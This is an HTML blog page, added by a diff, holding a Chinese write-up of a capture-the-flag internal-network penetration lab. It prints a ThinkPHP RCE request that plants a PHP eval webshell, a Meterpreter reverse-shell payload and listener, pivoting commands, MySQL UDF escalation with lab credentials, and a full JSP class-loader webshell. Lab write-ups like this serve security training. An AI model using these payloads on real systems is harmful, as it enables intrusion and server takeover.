@@ -1,0 +1,721 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <title>
+    FK Penetration |
+    
+    (&gt;ᯅ&lt;)
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
+  
+<link rel="stylesheet" href="../../../../css/loader.css">
+
+  <meta name="description" content="白日依山尽，黄河入海流。欲穷千里目，更上一层楼。  内网逻辑示意图  flag1获得网址 https:&#x2F;&#x2F;pentest.timlzh.com&#x2F; 访问网站  没有任何线索，尝试扫目录 发现有 robots.txt  进入这个目录  扫目录发现有很多.git的路径 猜测为.git泄露 githack可以拿到所有源码  发现public文件夹下面有一个thinkphp，而这个框架存在很多RCE漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FK Penetration">
+<meta property="og:url" content="http://example.com/2024/04/03/FK%20Penetration/index.html">
+<meta property="og:site_name" content="(&gt;ᯅ&lt;)">
+<meta property="og:description" content="白日依山尽，黄河入海流。欲穷千里目，更上一层楼。  内网逻辑示意图  flag1获得网址 https:&#x2F;&#x2F;pentest.timlzh.com&#x2F; 访问网站  没有任何线索，尝试扫目录 发现有 robots.txt  进入这个目录  扫目录发现有很多.git的路径 猜测为.git泄露 githack可以拿到所有源码  发现public文件夹下面有一个thinkphp，而这个框架存在很多RCE漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%201.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%202.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%203.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%204.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%205.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%206.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%207.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%208.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%209.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2010.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2011.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2012.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2013.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2014.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2015.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2016.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2017.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2018.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2019.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2020.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2021.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2022.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2023.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2024.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2025.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2026.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2027.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2028.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2029.png">
+<meta property="og:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled%2030.png">
+<meta property="article:published_time" content="2024-04-03T00:02:56.876Z">
+<meta property="article:modified_time" content="2024-04-03T00:43:11.327Z">
+<meta property="article:author" content="阿尼亚はこれが好き">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/04/03/FK%20Penetration/Untitled.png">
+  
+    <link rel="alternate" href="../../../../atom.xml" title="(>ᯅ<)" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="../../../../images/favicon.ico">
+  
+  
+  
+<link rel="stylesheet" href="../../../../css/style.css">
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+  
+    <script src="/sw.js"></script>
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg"></div>
+    <div class="loading-right-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    const startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    const endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('load', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="../../../../index.html">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="../../../../archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="../../../../about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="../../../../friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/banner.jpg" alt="FK Penetration">
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="../../../../index.html" id="logo">
+              <h1>FK Penetration</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-FK Penetration" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="" class="article-date-link">
+    <time datetime="2024-04-03T00:02:56.876Z" itemprop="datePublished">2024-04-03</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>白日依山尽，<br>黄河入海流。<br>欲穷千里目，<br>更上一层楼。</p>
+</blockquote>
+<p>内网逻辑示意图</p>
+<p><img src="Untitled.png"></p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>获得网址</p>
+<p><a target="_blank" rel="noopener" href="https://pentest.timlzh.com/">https://pentest.timlzh.com/</a></p>
+<p>访问网站</p>
+<p><img src="Untitled%201.png"></p>
+<p>没有任何线索，尝试扫目录</p>
+<p>发现有 robots.txt</p>
+<p><img src="Untitled%202.png"></p>
+<p>进入这个目录</p>
+<p><img src="Untitled%203.png"></p>
+<p>扫目录发现有很多.git的路径</p>
+<p><strong>猜测为.git泄露</strong></p>
+<p>githack可以拿到所有源码</p>
+<p><img src="Untitled%204.png"></p>
+<p>发现public文件夹下面有一个thinkphp，而这个框架存在很多RCE漏洞</p>
+<p>发现版本</p>
+<p><img src="Untitled%205.png"></p>
+<p><strong>thinkphp 5.0.23 漏洞</strong></p>
+<p>尝试<code>POST</code>写入<code>phpinfo</code></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[<span class="variable constant_">REQUEST_METHOD</span>]=echo <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> &gt; info.<span class="property">php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="Untitled%206.png"></p>
+<p>成功</p>
+<p><img src="Untitled%207.png"></p>
+<p>写入一句话木马</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[<span class="variable constant_">REQUEST_METHOD</span>]=echo <span class="string">&#x27;&lt;?php eval($_POST[cnm]); ?&gt;&#x27;</span> &gt; cnm.<span class="property">php</span></span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接成功</p>
+<p><img src="Untitled%208.png"></p>
+<p>根目录下</p>
+<p><img src="Untitled%209.png"></p>
+<p>由图已知网站服务器在内网，开始内网渗透环节</p>
+<p>需要使用msf</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119614618">【工具使用】——Metasploit(MSF)使用详解(超详细)-CSDN博客</a></p>
+<h1 id="内网渗透大致流程"><a href="#内网渗透大致流程" class="headerlink" title="内网渗透大致流程"></a>内网渗透大致流程</h1><p><img src="Untitled%2010.png"></p>
+<p>1，利用已经控制的一台计算机作为入侵内网的跳板，在其他内网计算机看来访问全部来自于跳板机(WEB Server)</p>
+<p>2，在攻击机和跳板机间建立 meterpreter 反向连接：配置监听 meterpreter 反向连接，跳板机开启msf建立的后门程序shell.php，建立meterpreter 建立反向连接</p>
+<p>3，收集信息、提权</p>
+<p>4，添加内网路由（可用socks代理将流量通过Meterpreter会话路由，从而访问并攻击内网中的其他主机。这是为了维持与内网的持续连接</p>
+<p>5，攻击内网主机（配置各种模块</p>
+<p>6，收集信息、提权</p>
+<p>7，攻击内网主机</p>
+<p>8，添加内网路由</p>
+<p>9，重复这一操作</p>
+<p>配置反向代理</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="variable constant_">LHOST</span>=lhost <span class="variable constant_">LPORT</span>=<span class="number">8888</span> -f elf &gt; shell.<span class="property">elf</span></span><br></pre></td></tr></table></figure>
+
+<p><code>LHOST</code>是与目标进行通信的msf所在ip，内网时用内网ip，外网用公网ip</p>
+<p>开启msf监听模块</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">set lport <span class="number">8888</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>0.0.0.0</code>指的是监听本机的端口</p>
+<p>蚁剑上传shell</p>
+<p><img src="Untitled%2011.png"></p>
+<p>终端提权，运行</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">777</span> shell.<span class="property">elf</span></span><br><span class="line">./shell.<span class="property">elf</span></span><br></pre></td></tr></table></figure>
+
+<p>成功<code>meterpreter</code> shell</p>
+<p><img src="Untitled%2012.png"></p>
+<p><img src="Untitled%2013.png"></p>
+<p>与此同时在泄露源码的<code>database.php</code>中拿到重要信息</p>
+<p><img src="Untitled%2014.png"></p>
+<h1 id="正式开始进攻"><a href="#正式开始进攻" class="headerlink" title="正式开始进攻"></a>正式开始进攻</h1><p>首先将入侵的第一台服务器作为跳板</p>
+<p>添加一条从跳板机到交换机的路由，这使得我可以用攻击机直接访问内网环境</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16590633.html">跳板攻击之: MSF 添加路由方式渗透内网 - f_carey - 博客园</a></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s <span class="number">10.88</span><span class="number">.12</span><span class="number">.0</span>/<span class="number">24</span> # 添加路由</span><br><span class="line">run autoroute -p # 查看存在路由</span><br></pre></td></tr></table></figure>
+
+<p><img src="Untitled%2015.png"></p>
+<p>将<code>meterpreter</code>进程放到后台方便后续操作，可以用<code>sessions id</code>切换多个<code>session</code></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p>由于我是在ECS服务器（cent_os）上面配置的msf，因此使用代理进行流量转发是非常有必要的：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">set srvport <span class="number">3389</span></span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p><strong><code>SRVHOST</code>参数指定了SOCKS代理服务器监听的地址。设置为<code>0.0.0.0</code>意味着代理将监听所有可用的网络接口，<code>SRVPORT</code>参数指定了SOCKS代理服务器监听的端口。</strong></p>
+<p>这意味着，当我用我的没有公网ip的主机连接 <code>[ ip ]：3389</code>，同时使用socks5方式代理时， 我将能够直接利用服务器的网络环境！！！！！使用服务器代理可以使我方便地访问内网环境</p>
+<p><img src="Untitled%2016.png"></p>
+<p>以上是浏览器代理，我们同时可以用sockscap来配置全局代理</p>
+<p><img src="Untitled%2017.png"></p>
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><p>第一个受害者是一个mysql服务器，账号密码已知</p>
+<p>**UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充。</p>
+<blockquote>
+<p>UDF 漏洞常用场景，通过其他漏洞(一句话木马等)获得了服务器权限，但是权限非常小,作用不大。再通过其他手段得到了MySQL的账号密码(如配置文件)。之后通过UDF 提权对系统权限进行一个提升。</p>
+</blockquote>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>在全局代理的情况下，直接利用sqlmap进行UDF提权，自动构造sys_exec( )函数</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.<span class="property">py</span></span><br><span class="line"></span><br><span class="line">sqlmap -d <span class="attr">mysql</span>:<span class="comment">//cnss:2dbdffb833bd44418825ef5d4f12183b@10.88.12.34:3306/mysql --os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>后端数据库选择<code>64bit</code></p>
+<p><img src="Untitled%2018.png"></p>
+<p><code>ls  /</code>，a（always）</p>
+<p><img src="Untitled%2019.png"></p>
+<p><img src="Untitled%2020.png"></p>
+<p><code>mysql</code> 连接数据库，查询可得 ip 与用户信息</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">10.88</span><span class="number">.12</span><span class="number">.34</span> -P <span class="number">3306</span> -u cnss -p</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line">use cnss;</span><br><span class="line">show tables;</span><br><span class="line">select * <span class="keyword">from</span> tomcat_info;</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>MSF自带UDF提权模块</p>
+<p>搜索MSF中关于<code>MySql</code>的脚本</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="Untitled%2021.png"></p>
+<p>接下来进行UDF 提权, 加载攻击载荷（仍然在msf中操作）</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set username cnss</span><br><span class="line">set password 2dbdffb833bd44418825ef5d4f12183b</span><br><span class="line">set rhost <span class="number">10.88</span><span class="number">.12</span><span class="number">.34</span></span><br><span class="line">set rport <span class="number">3306</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>dll上传成功后，执行<code>SQL</code> 语句 查看上传的<code>DLL</code> 文件名</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> mysql.<span class="property">func</span> where name = <span class="string">&quot;sys_exec&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过之前MSF生成的 dll 文件创建<code>sys_eval()</code>函数，使执行的命令存在回显</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">function</span> sys_eval returns string soname <span class="string">&quot;xxx.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>再次执行<code>eval</code>命令，根目录得到flag</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">CNSS</span>&#123;w1th_Us3r_D3f1n3d_Funct10n_w3_c4n_get_sySt3m_5he11!&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="Untitled%2022.png"></p>
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p><code>mysql</code>查询得到用户名tomcat和一串神秘代码</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32cc5886dc1fa8c106a02056292c465432cc5886dc1fa8c106a02056292c4654</span><br></pre></td></tr></table></figure>
+
+<p>md5解密得：<code>g00dPa$$w0rD</code></p>
+<p>nmap扫爆出来的ip：<code>10.88.12.173</code></p>
+<p>爆出来个<code>8080</code></p>
+<p>登录发现是tomcat</p>
+<p><img src="Untitled%2023.png"></p>
+<p>搜索tomcat 8.0.53 漏洞 发现了一个大知识点！！！！</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/serendipity1130/article/details/120029698">【Tomcat漏洞复现】CVE-2020-1938文件包含漏洞+Tomcat8+弱口令&amp;&amp;后台getshell漏洞+CVE_2017_12615远程代码执行漏洞_cve-2020-1938 getshell-CSDN博客</a></p>
+<p>利用jsp任意文件读造成RCE</p>
+<p>payload：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassLoader</span> &#123;</span><br><span class="line">        <span class="title function_">U</span>(<span class="params">ClassLoader c</span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="title class_">Class</span> <span class="title function_">g</span>(<span class="params">byte[] b</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">defineClass</span>(b, <span class="number">0</span>, b.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] <span class="title function_">base64Decode</span>(<span class="title class_">String</span> str) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Class</span> clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.<span class="title function_">getMethod</span>(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>).<span class="title function_">invoke</span>(clazz.<span class="title function_">newInstance</span>(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            <span class="title class_">Class</span> clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> decoder = clazz.<span class="title function_">getMethod</span>(<span class="string">&quot;getDecoder&quot;</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decode&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>).<span class="title function_">invoke</span>(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="title class_">String</span> cls = request.<span class="title function_">getParameter</span>(<span class="string">&quot;fk&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">U</span>(<span class="variable language_">this</span>.<span class="title function_">getClass</span>().<span class="title function_">getClassLoader</span>()).<span class="title function_">g</span>(<span class="title function_">base64Decode</span>(cls)).<span class="title function_">newInstance</span>().<span class="title function_">equals</span>(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>终端执行</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf fk.<span class="property">war</span>  fk.<span class="property">jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一个jar命令，用于创建一个名为<code>fk.war</code>的<code>WAR</code>文件，这个文件包含了<code>fk.jsp</code>文件</p>
+<p><img src="Untitled%2024.png"></p>
+<p>这里上传</p>
+<p><img src="Untitled%2025.png"></p>
+<p>没有404，证明成功上传且能够执行</p>
+<p>蚁剑配置代理后连接</p>
+<p><img src="Untitled%2026.png"></p>
+<p><img src="Untitled%2027.png"></p>
+<p>haha！！</p>
+<p><img src="Untitled%2028.png"></p>
+<p><img src="Untitled%2029.png"></p>
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p>接下来如法炮制</p>
+<p>1，连接meterpreter，上路由</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s <span class="number">172.52</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p>2，在这个shell里面发现敏感文件夹<code>/home/cnss</code> </p>
+<p>.bash_history 找到最后一个服务器</p>
+<p>利用ssh私钥连接</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">CNSS</span>&#123;H0w_d1d_y0u_g3t_h3r3!&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="Untitled%2030.png"></p>
+<p>几个TIPS</p>
+<p>1，配置msf后门的时候，务必确保服务器开了相应端口</p>
+<p>2，lhost <code>0.0.0.0/0</code> 表示允许从任意地址的任意端口访问</p>
+<p>3, 蚁剑运行shell时需要提权，可以用<code>chmod 777</code> ，表示可读，可写，可执行</p>
+<p>4，多记住常见的敏感目录，线索往往藏在其中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/04/03/FK%20Penetration/" data-id="cluj342ey00035cv32ed4hwvn" data-title="FK Penetration" class="article-share-link">Share</a>
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://d-sketon.top/img/backimg/bg1.jpg" data-sizes="auto" alt="Hello World" class="lazyload">
+        
+      
+      <a href="../../../03/25/hello-world/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Hello World
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">内网渗透大致流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B%E8%BF%9B%E6%94%BB"><span class="toc-number">3.</span> <span class="toc-text">正式开始进攻</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span 